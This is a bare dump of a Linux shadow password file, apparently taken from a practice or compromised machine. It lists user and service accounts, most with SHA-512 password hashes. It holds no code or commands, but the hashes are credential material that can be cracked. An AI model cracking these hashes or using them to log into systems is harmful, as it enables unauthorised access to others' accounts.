messagebus:*:16955:0:99999:7:::
sshd:*:16955:0:99999:7:::
peter:$6$4rg/9UDx$iktewIFzE5NWWfaiX2F3sLd79zTmworSqCD1U5eDkLbUqoM6tqeqzgluNjv7dBHOtH.tNDl9cTKvk.A0IP9to1:16957:0:99999:7:::
mysql:!:16955:0:99999:7:::
RNunemaker:$6$uIJc5IJn$xZuYd4N2l/EEtkp1lboWOipDUs53KnXlpCCxg1x3D9bki9GCjyrO4Rrll8z6jm.GSwbzMZSRbJ/5BsqAOK59x1:16957:0:99999:7:::
ETollefson:$6$CK1mfy7X$zd03AR9nakAnit9AgRE9mtqItTqXW1I9GyQv2NLBjw6jD0GboRLjHF1CIOqJ/Jaxo7HvZl.JB.nkmIIfw38rD.:16957:0:99999:7:::
DSwanger:$6$A15dDixv$k9T87ElFyo1T6HdL.4bXC0VRO.4K6p7gpC1wpkDxbU16xjZl35pSJM4TkXhtZQr36zXldz0NF/RXgv1.fadzQ0:16957:0:99999:7:::
AParnell:$6$5gjMkxgK$6qcxxKnHejCz62lcCkEhqH69UhX16S/tH6.Cc2xGVrpBjNVEPTLS9Nutoqz4ESnvwALiaWNLH0IhhqnpBLLt40:16957:0:99999:7:::
SHayslett:$6$dF.lG5Ca$SX9p9bNAbI3SJ4mVXt.LbYW56v2SH.jlBaCk/7dY5P/I3TkDE8toxAYo7d.g1lzwWBOGOhCG505uvLbEuKhOl.:16957:0:99999:7:::
MBassin:$6$ZvMOjgTg$VE6iCMv7zk.ai/jOQlLICM7X2i/UlyIoYHHcpnm4ZgrLWwWYdVvhFz1uxeRCUULpfSt2Hpsm1RRFSLHud/uQ8/:16957:0:99999:7:::
JBare:$6$MBXGTI9s$odOoT9pEUlq.Sfvafa8BsqKXnWTh5yOujI9aZMn5Lc579er.yighme/eq/9L8QSK7Po4JxzmXA0ggC1TK9oEO1:16957:0:99999:7:::
LSolum:$6$hLwPA60i$asFAVYq9GkZ4v23m68TMkhrXxiAfm/bbrNlwHY4JtOlFuWjl/t0ySBbcbVcLUcXh1g21fWUFobePx/Gujs61v.:16957:0:99999:7:::
IChadwick:!:16955:0:99999:7:::
MFrei:$6$OLtPJK6l$6gwb1kgkwB9BTtoJFYCywkRqVs49nF846brbZtS.T/YcINVLaBK8em3W6U1ia.wvSIZeCNdNA89hciQUqdYRT1:16957:0:99999:7:::
SStroud:$6$5i/WA9AT$l9emPkh0OSanWTfp77.lZfWgzgMyt6FOZo4/ZzB.ZnUkIV88o//zeNJao3GNHCp1sqn3qbCpuy7mitx8UeckI0:16957:0:99999:7:::
CCeaser:$6$DqGKwSWD$rHWmLKkp/mBMVUCclCeXaGHMDLUlSGtkzMzJL.9lMLIvnYnjPXl12sWMk1W89dfX1J5lcij1hvWIoTSdtBuWZ0:16957:0:99999:7:::
JKanode:$6$Fj17oX4k$cIdbSPBq6SMeTDLn8Mae51NyIBSW7kp80PWU2elItAyluyYUQkE74ck8XgUrJT9JcCpHdSd547KIrGN0oriDt.:16957:0:99999:7:::
CJoo:$6$6tCsCspl$EQDNU3bMQtu2aBiN8GMlKhu.is7RV5eOjcLGCPHirj5wDcoYX29tkm61Ie5ZoRgTfM.yArbL1cQ/zGLqZViv40:16957:0:99999:7:::
Eeth:!:16955:0:99999:7:::
LSolum2:!:16955:0:99999:7:::
JLipps:$6$Gav8lnn1$zH70APF5Im1yNYBlmBvBITUItueVmFyrQ0Ylofzs6llkfu72qwqMG00U997AgIhJiDzUgF7e05rypsMH0Pc0i/:16957:0:99999:7:::
jamie:$6$e7Nq31DF$YCvlRzVmD.Y.ywrQVMgq/xKpFO0QohDuUULqZh3rJjqyyDoj4f7V5431G6opMe6bFN6lrDLWjwNK7XAA3i4E/1:16957:0:99999:7:::
Sam:$6$5gXc6MoR$1S2NO/T2U4Bp8b0yb2PCGQakqqpFfiYDuac8wKSDdKVli9SaN8HW4ttS7ady9UgJMwXIb0NJQ7AS4wl7JojSJ/:16957:0:99999:7:::
Drew:$6$pBr69YDb$nGqqvWkan.r8tZRWDzkYqKDSDMQwTeIjfkVyLW.348Np/llkcxq5itRQULsw1Wk54D7vN7UUbIPLHWF8sqedm.:16957:0:99999:7:::
jess:$6$i3.L1/JH$xkyFxq4g7C.bCnQ.7QlJ/BTKy52O2DD87bQpuxumRP2cEAqCh9L4OGLGWlopuGPqY9bjuiWOvBbcnj0tncJJl0:16957:0:99999:7:::
SHAY:$6$XUBNWXG5$C89zHc8QmWHyFFQHdDOR4Gq5no86UXyVTDH1h9LxpzYoVLSafPOpEmP6GP2l483i4ulAfeOeHuYOJp4TENsir.:16957:0:99999:7:::
Taylor:$6$AJS.fMGD$Ogdp65Hy54OWITn1aFtfBRQg6bDcPNr/JbRSVN6CVD.5punKJZH2O9pTVxNcXYtmBk.PsljTFHzTDXbXmQOJF0:16957:0:99999:7:::
mel:$6$pR3NHNfN$FK5Wv35bWryCBTNXtR8BQUs3N89EDvBba4myH8FM9fIROCfFl6w3Gxo76CaPbADI2FZmd5omz6L6Iktp8iKw/0:16957:0:99999:7:::
kai:$6$B1BAHXsr$xQJ3EAXYdQRVV8rUKQ8Xs9ShoFQKyA5V9/DhnDJ.dGnO0wNZfAFk0X9lmyDBSxg3yStuDx7r5tGudThW2blYQ/:16957:0:99999:7:::
zoe:$6$boGWAOfc$COm1LlAajoz587SM9s06lmH.4CZGNccAUZs2tyWh9bhSQVXGNKqosakDHIqKKmoS8Ru5GoOAvndrQVQ9VWS1B/:16957:0:99999:7:::
NATHAN:$6$82TMEShI$JNaF5UZu2l0mFcNwPLEm9DWmLHdm6S9N7wbhQahbg812ddclua12e0VOG6XnMDAjFH4b4IXxVqQG9fGJGjKvn/:16957:0:99999:7:::
www:$6$l/llUXZO$1SczVSg5ZGaETBl6LUSe6DAdXvAUyJEtYkZBLeWHZMYY24pObPW6S0Nelm8y4Z3QGGni8PK960eZ3YbnJqGmy1:16957:0:99999:7:::
postfix:*:16955:0:99999:7:::
ftp:$6$Hc6LWHcl$BkH6aKdr6hGohVS9QmQjv09JYO87Yhw5qcxN6T1X0HK2IwM5kzdrpNstxL2sl6X9k7qXePB2qVwFxpGPu6GO30:16955:0:99999:7:::
elly:$6$Z.4nIyQj$DYXUEnU4NBeSgU7JapAHVWpfIsmemPQhaHMv7WDasAjFXRglDZxAQsBRHmeSaMCIWxRtvEzx.InGMRMGBrTqQ.:16957:0:99999:7:::

